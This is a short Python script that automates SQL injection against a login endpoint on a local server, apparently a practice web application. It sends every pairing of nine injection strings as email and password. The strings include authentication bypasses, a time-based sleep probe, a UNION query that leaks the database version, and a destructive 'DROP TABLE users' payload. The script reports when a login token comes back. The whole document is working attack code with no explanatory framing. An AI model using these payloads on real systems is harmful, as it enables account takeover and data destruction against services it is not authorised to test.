import requests

sql_payloads = [
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "'; DROP TABLE users; --",
    "' OR 1=1 --",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "admin'--",
    "' or sleep(5)--",
    "' UNION SELECT null, version()--"
]

BASE = "http://127.0.0.1:3001/"

s = requests.Session()

url = f"{BASE}/rest/user/login"

for p in sql_payloads:
    for p2 in sql_payloads:
        data = {
            "email": p,
            "password": p2
        }
        r = s.post(url, json=data)

        if r.status_code != 401:
            try:
                token = r.json().get("authentication", {}).get("token")
            except:
                token = None

            if token:
                print("LOGIN SUCCESS")
            else:
                print("LOGIN FAILED")